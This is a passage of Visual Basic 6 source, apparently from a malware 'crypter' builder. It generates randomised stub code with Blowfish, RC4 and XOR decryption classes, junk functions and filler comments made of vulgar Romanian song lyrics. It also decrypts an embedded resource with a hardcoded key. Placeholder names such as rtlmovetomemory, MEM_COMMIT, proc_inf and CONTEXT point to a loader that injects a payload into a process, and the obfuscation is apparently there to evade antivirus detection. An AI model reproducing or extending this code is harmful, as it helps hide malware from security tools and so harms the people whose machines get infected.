"  " & f.Text4.Text & "(51) = 122" & vbNewLine & _
"  " & f.Text4.Text & "(52) = 48" & vbNewLine & _
"  " & f.Text4.Text & "(53) = 49" & vbNewLine & _
"  " & f.Text4.Text & "(54) = 50" & vbNewLine & _
"  " & f.Text4.Text & "(55) = 51" & vbNewLine & _
"  " & f.Text4.Text & "(56) = 52" & vbNewLine & _
"  " & f.Text4.Text & "(57) = 53" & vbNewLine & _
"  " & f.Text4.Text & "(58) = 54" & vbNewLine & _
"  " & f.Text4.Text & "(59) = 55" & vbNewLine & _
"  " & f.Text4.Text & "(60) = 56" & vbNewLine & _
"  " & f.Text4.Text & "(61) = 57" & vbNewLine & _
"  " & f.Text4.Text & "(62) = 43" & vbNewLine & _
"  " & f.Text4.Text & "(63) = 47" & vbNewLine & _
"  " & f.Text4.Text & "(65) = 0" & vbNewLine & _
"  " & f.Text4.Text & "(66) = 1" & vbNewLine & _
"  " & f.Text4.Text & "(67) = 2" & vbNewLine & _
"  " & f.Text4.Text & "(68) = 3" & vbNewLine & _
"  " & f.Text4.Text & "(69) = 4" & vbNewLine & _
"  " & f.Text4.Text & "(70) = 5" & vbNewLine & _
"  " & f.Text4.Text & "(71) = 6" & vbNewLine & _
"  " & f.Text4.Text & "(72) = 7" & vbNewLine & _
"  " & f.Text4.Text & "(73) = 8" & vbNewLine & _
"  " & f.Text4.Text & "(74) = 9" & vbNewLine & _
"  " & f.Text4.Text & "(75) = 10" & vbNewLine
  
mdea = mdea & "  " & f.Text4.Text & "(76) = 11" & vbNewLine & _
"  " & f.Text4.Text & "(77) = 12" & vbNewLine & _
"  " & f.Text4.Text & "(78) = 13" & vbNewLine & _
"  " & f.Text4.Text & "(79) = 14" & vbNewLine & _
"  " & f.Text4.Text & "(80) = 15" & vbNewLine & _
"  " & f.Text4.Text & "(81) = 16" & vbNewLine & _
"  " & f.Text4.Text & "(82) = 17" & vbNewLine & _
"  " & f.Text4.Text & "(83) = 18" & vbNewLine & _
"  " & f.Text4.Text & "(84) = 19" & vbNewLine & _
"  " & f.Text4.Text & "(85) = 20" & vbNewLine & _
"  " & f.Text4.Text & "(86) = 21" & vbNewLine & _
"  " & f.Text4.Text & "(87) = 22" & vbNewLine & _
"  " & f.Text4.Text & "(88) = 23" & vbNewLine & _
"  " & f.Text4.Text & "(89) = 24" & vbNewLine & _
"  " & f.Text4.Text & "(90) = 25" & vbNewLine & _
"  " & f.Text4.Text & "(97) = 26" & vbNewLine & _
"  " & f.Text4.Text & "(98) = 27" & vbNewLine & _
"  " & f.Text4.Text & "(99) = 28" & vbNewLine & _
"  " & f.Text4.Text & "(100) = 29" & vbNewLine & _
"  " & f.Text4.Text & "(101) = 30" & vbNewLine & _
"  " & f.Text4.Text & "(102) = 31" & vbNewLine & _
"  " & f.Text4.Text & "(103) = 32" & vbNewLine & _
"  " & f.Text4.Text & "(104) = 33" & vbNewLine & _
"  " & f.Text4.Text & "(105) = 34" & vbNewLine & _
"  " & f.Text4.Text & "(106) = 35" & vbNewLine
  
mdea = mdea & "  " & f.Text4.Text & "(107) = 36" & vbNewLine & _
"  " & f.Text4.Text & "(108) = 37" & vbNewLine & _
"  " & f.Text4.Text & "(109) = 38" & vbNewLine & _
"  " & f.Text4.Text & "(110) = 39" & vbNewLine & _
"  " & f.Text4.Text & "(111) = 40" & vbNewLine & _
"  " & f.Text4.Text & "(112) = 41" & vbNewLine & _
"  " & f.Text4.Text & "(113) = 42" & vbNewLine & _
"  " & f.Text4.Text & "(114) = 43" & vbNewLine & _
"  " & f.Text4.Text & "(115) = 44" & vbNewLine & _
"  " & f.Text4.Text & "(116) = 45" & vbNewLine & _
"  " & f.Text4.Text & "(117) = 46" & vbNewLine & _
"  " & f.Text4.Text & "(118) = 47" & vbNewLine & _
"  " & f.Text4.Text & "(119) = 48" & vbNewLine & _
"  " & f.Text4.Text & "(120) = 49" & vbNewLine & _
"  " & f.Text4.Text & "(121) = 50" & vbNewLine & _
"  " & f.Text4.Text & "(122) = 51" & vbNewLine & _
"  " & f.Text4.Text & "(48) = 52" & vbNewLine & _
"  " & f.Text4.Text & "(49) = 53" & vbNewLine & _
"  " & f.Text4.Text & "(50) = 54" & vbNewLine & _
"  " & f.Text4.Text & "(51) = 55" & vbNewLine & _
"  " & f.Text4.Text & "(52) = 56" & vbNewLine & _
"  " & f.Text4.Text & "(53) = 57" & vbNewLine & _
"  " & f.Text4.Text & "(54) = 58" & vbNewLine & _
"  " & f.Text4.Text & "(55) = 59" & vbNewLine & _
"  " & f.Text4.Text & "(56) = 60" & vbNewLine
  
mdea = mdea & "  " & f.Text4.Text & "(57) = 61" & vbNewLine & _
"  " & f.Text4.Text & "(43) = 62" & vbNewLine & _
"  " & f.Text4.Text & "(47) = 63" & vbNewLine & _
"End Sub" & vbNewLine
End Function
Public Function lblowfish() As String
X = """"
lblowfish = "VERSION 1.0 CLASS" & vbCrLf & "BEGIN" & vbCrLf & _
"  MultiUse = -1" & vbCrLf & "  Persistable = 0" & vbCrLf & _
"  DataBindingBehavior = 0" & vbCrLf & "  DataSourceBehavior = 0" & vbCrLf & _
"  MTSTransactionMode = 0" & vbCrLf & "End" & vbCrLf & "Attribute VB_Name = " & _
X & c.Text & X & vbCrLf & "Attribute VB_GlobalNameSpace = False" & vbCrLf & "Attribute VB_Creatable = True" & vbCrLf & _
"Attribute VB_PredeclaredId = False" & vbCrLf & "Attribute VB_Exposed = False" & vbCrLf & _
"Option Explicit" & vbNewLine & _
"Event " & f.Text1.Text & "(" & f.Text2.Text & " As Long)" & vbNewLine & _
"Private Const " & f.Text5.Text & " = 16" & vbNewLine & _
"Private m_pBox(0 To " & f.Text5.Text & " + 1) As Long" & vbNewLine & _
"Private m_sBox(0 To 3, 0 To 255) As Long" & vbNewLine & _
"Private m_KeyValue As String" & vbNewLine & _
"Private m_RunningComp As Boolean" & vbNewLine & _
"Private m_bytIndex(0 To 63) As Byte" & vbNewLine & _
"Private " & f.Text4.Text & "(0 To 255) As Byte" & vbNewLine

lblowfish = lblowfish & "Private Const k_bytEqualSign As Byte = 61" & vbNewLine & _
"Private Const k_bytMask1 As Byte = 3" & vbNewLine & _
"Private Const k_bytMask2 As Byte = 15" & vbNewLine & _
"Private Const k_bytMask3 As Byte = 63" & vbNewLine & _
"Private Const k_bytMask4 As Byte = 192" & vbNewLine & _
"Private Const k_bytMask5 As Byte = 240" & vbNewLine & _
"Private Const k_bytMask6 As Byte = 252" & vbNewLine & _
"Private Const k_bytShift2 As Byte = 4" & vbNewLine & _
"Private Const k_bytShift4 As Byte = 16" & vbNewLine & _
"Private Const k_bytShift6 As Byte = 64" & vbNewLine & _
"Private Const k_lMaxBytesPerLine As Long = 152" & vbNewLine

If rn2 = "1" Then
lblowfish = lblowfish & mdea2 & mdea1
Else
lblowfish = lblowfish & mdea1 & mdea2
End If
End Function
Private Function mdea2()
Dim finish As String
Buffer() = LoadResData(2, "RCDATA")

ifile = FreeFile
Call blowfish.DecryptByte(Buffer(), "vqHwh3HBPt6yYBJORKimczUVbtRup3")
finish = StrConv(Buffer(), vbUnicode)

Sleep 1000
If rn2 = "1" Then
mdea2 = finish & vbNewLine & mdea
Else
mdea2 = mdea & finish & vbNewLine
End If
End Function
Private Function mdea1()
If rn2 = "1" Then
mdea1 = blo & blow
Else
mdea1 = blow & blo
End If
End Function

Private Function blow1()
If rn2 = "1" Then
blow1 = catalin222 & catalin111
Else
blow1 = catalin111 & catalin222
End If
End Function
Private Function blow2()
If rn2 = "1" Then
blow2 = catalin66 & catalin33
Else
blow2 = catalin33 & catalin66
End If
End Function
Private Function blow()
If rn2 = "1" Then
blow = blow2 & blow1
Else
blow = blow1 & blow2
End If
End Function
Private Function blo()
If rn2 = "1" Then
blo = catalin200 & catalin100
Else
blo = catalin100 & catalin200
End If
End Function
Private Function catalin200()
If rn2 = "1" Then
catalin200 = catalin11 & catalin10
Else
catalin200 = catalin10 & catalin11
End If
End Function
Private Function catalin100()
If rn2 = "1" Then
catalin100 = catalin9 & catalin8
Else
catalin100 = catalin8 & catalin9
End If
End Function
Private Function catalin66()
If rn2 = "1" Then
catalin66 = catalin7 & catalin6
Else
catalin66 = catalin6 & catalin7
End If
End Function
Private Function catalin33()
If rn2 = "1" Then
catalin33 = catalin5 & catalin4
Else
catalin33 = catalin4 & catalin5
End If
End Function
Private Function catalin222()
If rn2 = "1" Then
catalin222 = catalin3 & catalin2
Else
catalin222 = catalin2 & catalin3
End If
End Function
Private Function catalin111()
If rn2 = "1" Then
catalin111 = catalin1 & catalin
Else
catalin111 = catalin & catalin1
End If
End Function
Private Function gicu()
If Check4.Value = 1 Then
gicu = "Private Function " & junk7.Text & "()" & vbNewLine & _
"  On error goto " & junk8.Text & vbNewLine & _
"  if " & junk7.Text & " <> 0 then" & vbNewLine & _
"  " & junk7.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
junk8.Text & " :" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If

gicu = gicu & "Public Sub " & c5.Text & "(" & c6.Text & "() As Byte, Optional " & c7.Text & " As String)" & vbNewLine & _
"  Call " & c8.Text & "(" & c6.Text & "(), " & c7.Text & ")" & vbNewLine & _
"End Sub" & vbNewLine

If Check4.Value = 1 Then
gicu = gicu & "  '" & lRan(10) & vbNewLine & _
"  'sclav sau stapan?" & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  'geniu sau nebun?" & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  'cand toti tac sau spun:" & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  'bine-ai venit sau ramas bun." & vbNewLine & _
"  '" & lRan(10) & vbNewLine
End If

End Function
Private Function gicu1()
gicu1 = "Public Function " & c1.Text & "(" & c2.Text & " As String, Optional " & c3.Text & " As String) As String" & vbNewLine & _
"  Dim " & c4.Text & "() As Byte" & vbNewLine & _
"  " & c4.Text & "() = StrConv(" & c2.Text & ", vbFromUnicode)" & vbNewLine & _
"  Call " & c5.Text & "(" & c4.Text & "(), " & c3.Text & ")" & vbNewLine & _
"  " & c1.Text & " = StrConv(" & c4.Text & "(), vbUnicode)" & vbNewLine & _
"End Function" & vbNewLine


If Check4.Value = 1 Then
gicu1 = gicu1 & "  '" & lRan(10) & vbNewLine & _
"  'rai sau iad?" & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  'rau sau bun?" & vbNewLine & _
"  'iarba sau tutun?" & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  'fericit sau roman?" & vbNewLine & _
"  '" & lRan(10) & vbNewLine
End If
End Function
Public Function lrc4() As String
X = """"
lrc4 = "VERSION 1.0 CLASS" & vbCrLf & _
"BEGIN" & vbCrLf & _
"  MultiUse = -1  'True" & vbCrLf & _
"  Persistable = 0  'NotPersistable" & vbCrLf & _
"  DataBindingBehavior = 0  'vbNone" & vbCrLf & _
"  DataSourceBehavior = 0   'vbNone" & vbCrLf & _
"  MTSTransactionMode = 0   'NotAnMTSObject" & vbCrLf & _
"End" & vbCrLf & _
"Attribute VB_Name = " & X & c.Text & X & vbCrLf & _
"Attribute VB_GlobalNameSpace = False" & vbCrLf & _
"Attribute VB_Creatable = True" & vbCrLf & _
"Attribute VB_PredeclaredId = False" & vbCrLf & _
"Attribute VB_Exposed = False" & vbCrLf & _
"Option Explicit" & vbCrLf & _
"Event " & c27.Text & "(" & c28.Text & " As Long)" & vbCrLf & _
"Private " & c29.Text & " As String" & vbCrLf & _
"Private " & c30.Text & "(0 To 255) As Integer" & vbCrLf

Sleep 500
If rn2 = "1" Then
lrc4 = lrc4 & gicu22 & gicu11
Else
lrc4 = lrc4 & gicu11 & gicu22
End If
Sleep 500

End Function
Private Function gicu11()
Sleep 500
If rn2 = "1" Then
gicu11 = gicu1 & gicu
Else
gicu11 = gicu & gicu1
End If
End Function
Private Function gicu22()
Sleep 500
If rn2 = "1" Then
gicu22 = gicu3 & gicu2
Else
gicu22 = gicu2 & gicu3
End If
End Function

Private Function gicu3()
If Check4.Value = 1 Then
gicu3 = "  '" & lRan(RandomNumber) & vbNewLine & _
"  'Sa ma bata vantu daca va mint...Sa mor daca-nteleg...." & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Cum unii sunt pi*de mai pi*de decat pi*dele gen Jutin Timberlake" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Mentinete-n dans ... in balans... si vai de c*rul tau" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'K-au pus baietii ochii pe tine sa te-ncoroneze Miss Bulau" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Pe barman il tin ostatic pana dupa miezul noptii" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Doar stii... k dormi mai des prin balti decat sinistratii" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Hai k vine-o doamna...mai toarna 100 de blana-n cana" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'S-o iau la goana-ntrun picior ca Prigoana..." & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine
End If

gicu3 = "Public Property Let " & c20.Text & "(" & c21.Text & " As String)" & vbNewLine & _
"  Dim " & c22.Text & " As Long" & vbNewLine & _
"  Dim " & c23.Text & " As Long" & vbNewLine & _
"  Dim " & c24.Text & " As Byte" & vbNewLine & _
"  Dim " & c25.Text & "() As Byte" & vbNewLine & _
"  Dim " & c26.Text & " As Long" & vbNewLine & _
"  If (" & c29.Text & " = " & c21.Text & ") Then Exit Property" & vbNewLine & _
"  " & c29.Text & " = " & c21.Text & vbNewLine & _
"  " & c25.Text & "() = StrConv(" & c29.Text & ", vbFromUnicode)" & vbNewLine & _
"  " & c26.Text & " = Len(" & c29.Text & ")" & vbNewLine & _
"  For " & c22.Text & " = 0 To 255" & vbNewLine & _
"  " & c30.Text & "(" & c22.Text & ") = " & c22.Text & vbNewLine & _
"  Next " & c22.Text & vbNewLine & _
"  For " & c22.Text & " = 0 To 255" & vbNewLine & _
"  " & c23.Text & " = (" & c23.Text & " + " & c30.Text & "(" & c22.Text & ") + " & c25.Text & "(" & c22.Text & " Mod " & c26.Text & ")) Mod 256" & vbNewLine & _
"  " & c24.Text & " = " & c30.Text & "(" & c22.Text & ")" & vbNewLine & _
"  " & c30.Text & "(" & c22.Text & ") = " & c30.Text & "(" & c23.Text & ")" & vbNewLine & _
"  " & c30.Text & "(" & c23.Text & ") = " & c24.Text & vbNewLine & _
"  Next" & vbNewLine & _
"End Property" & vbNewLine

If Check4.Value = 1 Then
gicu3 = gicu3 & "Private Function " & junk9.Text & "()" & vbNewLine & _
"  On error goto " & junk10.Text & vbNewLine & _
"  if " & junk9.Text & " <> 0 then" & vbNewLine & _
"  " & junk9.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
junk10.Text & " :" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If
End Function
Private Function jiji()
If Check6.Value = 1 Then
jiji = jiji & "Private Function " & f.j8.Text & "()" & vbNewLine & _
"  On error goto " & f.j9.Text & vbNewLine & _
"  if " & f.j8.Text & " <> 0 then" & vbNewLine & _
"  " & f.j8.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
f.j9.Text & " :" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If

jiji = jiji & "Public Sub " & xr4.Text & "(" & xr5.Text & "() As Byte, Optional " & xr6.Text & " As String)" & vbNewLine & _
"  Call " & xr7.Text & "(" & xr5.Text & "(), " & xr6.Text & ")" & vbNewLine & _
"End Sub" & vbNewLine

End Function
Private Function gicu2()
gicu2 = "Public Sub " & c8.Text & "(" & c9.Text & "() As Byte, Optional " & c10.Text & " As String)" & vbNewLine & _
"  Dim " & c11.Text & " As Long" & vbNewLine & _
"  Dim " & c12.Text & " As Long" & vbNewLine & _
"  Dim " & c13.Text & " As Byte" & vbNewLine & _
"  Dim " & c14.Text & " As Long" & vbNewLine & _
"  Dim " & c15.Text & " As Long" & vbNewLine & _
"  Dim " & c16.Text & " As Long" & vbNewLine & _
"  Dim " & c17.Text & " As Long" & vbNewLine & _
"  Dim " & c18.Text & " As Long" & vbNewLine & _
"  Dim " & c19.Text & "(0 To 255) As Integer" & vbNewLine & _
"  If (Len(" & c10.Text & ") > 0) Then Me." & c20.Text & " = " & c10.Text & vbNewLine & _
"  Call " & t26.Text & "(" & c19.Text & "(0), " & c30.Text & "(0), 512)" & vbNewLine & _
"  " & c15.Text & " = UBound(" & c9.Text & ") + 1" & vbNewLine & _
"  " & c16.Text & " = " & c15.Text & vbNewLine & _
"  For " & c14.Text & " = 0 To (" & c15.Text & " - 1)" & vbNewLine & _
"  " & c11.Text & " = (" & c11.Text & " + 1) Mod 256" & vbNewLine & _
"  " & c12.Text & "  = (" & c12.Text & " + " & c19.Text & "(" & c11.Text & ")) Mod 256" & vbNewLine & _
"  " & c13.Text & " = " & c19.Text & "(" & c11.Text & ")" & vbNewLine & _
"  " & c19.Text & "(" & c11.Text & ") = " & c19.Text & "(" & c12.Text & ")" & vbNewLine & _
"  " & c19.Text & "(" & c12.Text & ") = " & c13.Text & vbNewLine & _
"  " & c9.Text & "(" & c14.Text & ") = " & c9.Text & "(" & c14.Text & ") Xor (" & c19.Text & "((" & c19.Text & "(" & c11.Text & ") + " & c19.Text & "(" & c12.Text & ")) Mod 256))" & vbNewLine & _
"  If (" & c14.Text & " >= " & c18.Text & ") Then" & vbNewLine & _
"  " & c17.Text & " = Int((" & c14.Text & " / " & c16.Text & ") * 100)" & vbNewLine & _
"  " & c18.Text & " = (" & c16.Text & " * ((" & c17.Text & " + 1) / 100)) + 1" & vbNewLine & _
"  RaiseEvent " & c27.Text & "(" & c17.Text & ")" & vbNewLine
    
gicu2 = gicu2 & "  End If" & vbNewLine & _
"  Next" & vbNewLine & _
"  If (" & c17.Text & " <> 100) Then RaiseEvent " & c27.Text & "(100)" & vbNewLine & _
"End Sub" & vbNewLine

If Check4.Value = 1 Then
gicu2 = gicu2 & "  '" & lRan(20) & vbCrLf & _
"  'Tre ' sa trag un shot, treaz nu ma mai suport" & vbCrLf & _
"  '" & lRan(30) & vbCrLf & _
"  'Cu un ultim efort o sa ma'mbat ca un porc" & vbCrLf & _
"  '" & lRan(20) & vbCrLf & _
"  'Vreau sa afle totzi, nu sa citesca'n stele" & vbCrLf & _
"  '" & lRan(23) & vbCrLf & _
"  'Ma comport exemplar dupa standardele mele" & vbCrLf & _
"  '" & lRan(30) & vbCrLf
Sleep 500
End If

End Function
Private Function jiji1()

If Check4.Value = 1 Then
jiji1 = "  '" & lRan(RandomNumber) & vbNewLine & _
"  'Vrei de baut? Nu-ti dau! Ce plm... K n-am eo Chef..." & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Da ce sunt sef la Crucea Rosie sau patron la UNICEF?" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Tine usa ca nu-i bec si-alunec..nu prea stau drept" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine & _
"  'Daca tot ma pish...vreau sa ma pish pana-n chiuveta direct" & vbNewLine & _
"  '" & lRan(RandomNumber) & vbNewLine
End If


jiji1 = "Public Sub " & xr7.Text & "(" & xr14.Text & "() As Byte, Optional " & xr15.Text & " As String)" & vbNewLine & _
"  Dim " & xr16.Text & " As Long" & vbNewLine & _
"  Dim " & xr17.Text & " As Long" & vbNewLine & _
"  Dim " & xr18.Text & " As Long" & vbNewLine & _
"  Dim " & xr19.Text & " As Long" & vbNewLine & _
"  Dim " & xr20.Text & " As Long" & vbNewLine & _
"  If (Len(" & xr15.Text & ") > 0) Then Me." & xr2.Text & " = " & xr15.Text & vbNewLine & _
"  " & xr17.Text & " = UBound(" & xr14.Text & ") + 1" & vbNewLine & _
"  " & xr18.Text & " = " & xr17.Text & vbNewLine & _
"  For " & xr16.Text & " = 0 To (" & xr17.Text & " - 1)" & vbNewLine & _
"  " & xr14.Text & "(" & xr16.Text & ") = " & xr14.Text & "(" & xr16.Text & ") Xor " & xr11.Text & "(" & xr16.Text & " Mod " & xr12.Text & ")" & vbNewLine & _
"  If (" & xr16.Text & " >= " & xr20.Text & ") Then" & vbNewLine & _
"  " & xr19.Text & " = Int((" & xr16.Text & " / " & xr18.Text & ") * 100)" & vbNewLine & _
"  " & xr20.Text & " = (" & xr18.Text & " * ((" & xr19.Text & " + 1) / 100)) + 1" & vbNewLine & _
"  RaiseEvent " & xr.Text & "(" & xr19.Text & ")" & vbNewLine & _
"  End If" & vbNewLine & _
"  Next" & vbNewLine & _
"  If (" & xr19.Text & " <> 100) Then RaiseEvent " & xr.Text & "(100)" & vbNewLine & _
"End Sub" & vbNewLine

If Check6.Value = 1 Then
jiji1 = jiji1 & "Private Function " & f.j20.Text & "()" & vbNewLine & _
"  On error goto " & f.j21.Text & vbNewLine & _
"  if " & f.j20.Text & " <> 0 then" & vbNewLine & _
"  " & f.j20.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
f.j21.Text & " :" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If

End Function
Public Function lXOR() As String
X = """"
lXOR = "VERSION 1.0 CLASS" & vbCrLf & _
"BEGIN" & vbCrLf & _
"  MultiUse = -1  'True" & vbCrLf & _
"  Persistable = 0  'NotPersistable" & vbCrLf & _
"  DataBindingBehavior = 0  'vbNone" & vbCrLf & _
"  DataSourceBehavior = 0   'vbNone" & vbCrLf & _
"  MTSTransactionMode = 0   'NotAnMTSObject" & vbCrLf & _
"End" & vbCrLf & _
"Attribute VB_Name = " & X & c.Text & X & vbCrLf & _
"Attribute VB_GlobalNameSpace = False" & vbCrLf & _
"Attribute VB_Creatable = True" & vbCrLf & _
"Attribute VB_PredeclaredId = False" & vbCrLf & _
"Attribute VB_Exposed = False" & vbCrLf & _
"Option Explicit" & vbCrLf

lXOR = lXOR & "Private " & xr11.Text & "() As Byte" & vbNewLine & _
"Private " & xr12.Text & " As Long" & vbNewLine & _
"Private " & xr13.Text & " As String" & vbNewLine & _
"Event " & xr.Text & "(" & xr1.Text & " As Long)" & vbNewLine

Sleep 500
If rn2 = "1" Then
lXOR = lXOR & jiji22 & jiji11
Else
lXOR = lXOR & jiji11 & jiji22
End If
Sleep 500
End Function

Private Function jiji11()
Sleep 500
If rn2 = "1" Then
jiji11 = jiji1 & jiji
Else
jiji11 = jiji & jiji1
End If
End Function

Private Function jiji22()
Sleep 500
If rn2 = "1" Then
jiji22 = jiji3 & jiji2
Else
jiji22 = jiji2 & jiji3
End If
End Function

Private Function jiji3()
jiji3 = "Public Property Let " & xr2.Text & "(" & xr3.Text & " As String)" & vbNewLine & _
"  If (" & xr13.Text & " = " & xr3.Text & ") Then Exit Property" & vbNewLine & _
"  " & xr13.Text & " = " & xr3.Text & vbNewLine & _
"  " & xr12.Text & " = Len(" & xr3.Text & ")" & vbNewLine & _
"  " & xr11.Text & "() = StrConv(" & xr13.Text & ", vbFromUnicode)" & vbNewLine & _
"End Property" & vbNewLine

If Check6.Value = 1 Then
jiji3 = jiji3 & "Private Function " & f.j9.Text & "()" & vbNewLine & _
"  On error goto " & f.j10.Text & vbNewLine & _
"  if " & f.j9.Text & " <> 0 then" & vbNewLine & _
"  " & f.j9.Text & " = 0" & vbNewLine & _
"  End If" & vbNewLine & _
f.j10.Text & " :" & vbNewLine & _
"  Exit function" & vbNewLine & _
"End Function" & vbNewLine
End If
End Function
Private Function jiji2()
jiji2 = jiji2 & "Public Function " & c1.Text & "(" & xr8.Text & " As String, Optional " & xr9.Text & " As String) As String" & vbNewLine & _
"  Dim " & xr10.Text & "() As Byte" & vbNewLine & _
"  " & xr10.Text & "() = StrConv(" & xr8.Text & ", vbFromUnicode)" & vbNewLine & _
"  Call " & xr4.Text & "(" & xr10.Text & "(), " & xr9.Text & ")" & vbNewLine & _
"  " & c1.Text & " = StrConv(" & xr10.Text & "(), vbUnicode)" & vbNewLine & _
"End Function" & vbNewLine

If Check4.Value = 1 Then
jiji2 = jiji2 & "  '" & lRan(10) & vbNewLine & _
"  'Presupun ca m-auzi acum, date-n gatu matii!" & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  'Da-ten gatu matii! Da-ten gatu matii!" & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  'Te luam la p**a razand oricum da-ten gatu matii!" & vbNewLine & _
"  '" & lRan(10) & vbNewLine & _
"  'Da-ten gatu matii! Da-ten gatu matii!" & vbNewLine & _
"  '" & lRan(7) & vbNewLine
Sleep 500
End If
End Function
Private Sub ki()
hh:
f.ifile.Text = RandomNumber
f.ifile1.Text = RandomNumber
If f.ifile.Text = f.ifile1.Text Then
GoTo hh
End If
End Sub

Private Sub Command1_Click()
If Text1.Text = "" Then Exit Sub
If l1.Text = "" Then Exit Sub
If l2.Text = "" Then Exit Sub
Command1.Enabled = False
f.r.Text = lk
f.r2.Text = lk 'sData
f.r3.Text = rnx
If f.r3.Text = "14" Then
f.r3.Text = rnx
End If
f.r4.Text = lk 'sub main
f.Text1.Text = lk 'pr
f.Text2.Text = lk 'percent
f.Text3.Text = lk 'fn
f.Text4.Text = lk 'm_bytReverseIndex
f.Text5.Text = lk 'rounds
Sleep 500
If Check6.Value = 1 Then
f.junk5.Text = lk
f.junk6.Text = lk
f.junk7.Text = lk
f.junk8.Text = lk
f.junk9.Text = lk
f.junk10.Text = lk
f.junk11.Text = lk
f.junk12.Text = lk
f.junk13.Text = lk

Sleep 1000

f.junk14.Text = lk
f.junk15.Text = lk
f.junk16.Text = lk
f.junk17.Text = lk
f.junk18.Text = lk
Sleep 1000
End If

Call ki

f.aes.Text = lk
f.aes1.Text = lk
f.aes2.Text = lk
f.aes3.Text = lk

If f.aes.Text = f.aes1.Text Or f.aes1.Text = f.aes2.Text Or f.aes2.Text = f.aes3.Text Then
f.aes.Text = lk
f.aes1.Text = lk
f.aes2.Text = lk
f.aes3.Text = lk
End If

Sleep 500
m.Text = lk 'module name
t26.Text = lk 'rtlmovetomemory
m1.Text = lk 'CON_F
m2.Text = lk 'CR_S
m3.Text = lk 'MEM_COMMIT
m4.Text = lk 'MEM_REV
m5.Text = lk 'PG_EX_RW
m6.Text = lk 'Sinf
m7.Text = lk 'proc_inf
m8.Text = lk 'fl_ar

Sleep 1000

m9.Text = lk 'cnt
m10.Text = lk 'im_ds
m11.Text = lk 'im_dt
m12.Text = lk 'im_o
m13.Text = lk 'im_fl
m14.Text = lk 'im_hd
m15.Text = lk 'im_sec_hd

Sleep 1000

m16.Text = lk 'lt
m17.Text = lk 'lt1
m18.Text = lk 'zuh
m19.Text = lk 'bere
m20.Text = lk 'hcs
m21.Text = lk 'subere
m22.Text = lk 'subhcs
m23.Text = lk 'buff
m24.Text = lk 'sex
m25.Text = lk 'sdir
m26.Text = lk 'snam
m27.Text = lk 'spw
m28.Text = lk 'c

m29.Text = RandomLetter 'i
m30.Text = RandomLetter 'n
Sleep 1000
If m29.Text = m30.Text Then
m29.Text = RandomLetter 'i
m30.Text = RandomLetter 'n
End If

f.r1.Text = RandomLetter

If f.r1.Text = m29.Text Or f.r1.Text = m30.Text Then
f.r1.Text = RandomLetter
End If

m31.Text = lk 'nush
m32.Text = lk 'drt
m33.Text = lk 'split
m34.Text = lk 'jsp
m35.Text = lk 'lBrsw
m36.Text = lk 'sResult
m37.Text = lk 'pos

Sleep 1000

m38.Text = lk 'god
m39.Text = lk 'x
m40.Text = lk 'current
m41.Text = lk 'proc

m42.Text = lk 'CallAPIbyName

m43.Text = lk 'lpr
m44.Text = lk 'lPtr
m45.Text = lk 'dlm
m46.Text = lk 'limit

Sleep 1000

c82.Text = lk 'dim plm as new api

m47.Text = lk 'lLPos
m48.Text = lk 'ljul
m49.Text = lk 'lELe
m50.Text = lk 'lcio
m51.Text = lk 'lpor
m52.Text = lk 'vtemp
m53.Text = lk 'proc
m54.Text = lk 'ring
m55.Text = lk 'Pidh
m56.Text = lk 'zp

Sleep 1000

m57.Text = lk 'prt
m58.Text = lk 'inf
m59.Text = lk 'Pi
m60.Text = lk 'Ctx
m61.Text = RandomLetter 'i
m62.Text = lk 'lk
m63.Text = lk 'lRet
m64.Text = lk 'bvBuff


Sleep 500

m69.Text = lk 'psw1
m70.Text = lk 'psw2
m71.Text = lk 'psw3
m72.Text = lk 'ps1
m73.Text = lk 'plm
m74.Text = lk 'delay

p1.Text = lk 'title
p2.Text = lk 'name
k.Text = lk 'company name
l.Text = lk

Sleep 1000

c1.Text = lk 'dstr
c2.Text = lk 'y64
c3.Text = lk 'ya64
c4.Text = lk 'hblk
c5.Text = lk 'dbyt
c6.Text = lk 'f
c7.Text = lk 'iwfsa
c8.Text = lk 'owd
c9.Text = lk 'radd
c10.Text = lk 'tad
c11.Text = lk 'key
c12.Text = lk 'jblk
c13.Text = lk 'sI
c14.Text = lk 'simput
c15.Text = lk 'bytInput
c16.Text = lk 'bytWorkspace

Sleep 1000

c17.Text = lk 'bytR
c18.Text = lk 'lInputCounter
c19.Text = lk 'lWorkspaceCounter
c20.Text = lk ' bray
c21.Text = lk 'Text
c22.Text = lk 'Key
c23.Text = lk 'IsTextIn64
c24.Text = lk 'byteArray
c25.Text = lk 'key
c26.Text = lk ' temp -c
c27.Text = lk 'x1
c28.Text = lk 'xr
c29.Text = lk 'i
c30.Text = lk 'j

Sleep 1000

c31.Text = lk 'new_value
c32.Text = lk 'i propety let 2
c33.Text = lk 'j 2
c34.Text = lk  'k
c35.Text = lk 'dataX
c36.Text = lk 'datal
c37.Text = lk 'datar

Sleep 1000

c38.Text = lk 'Key
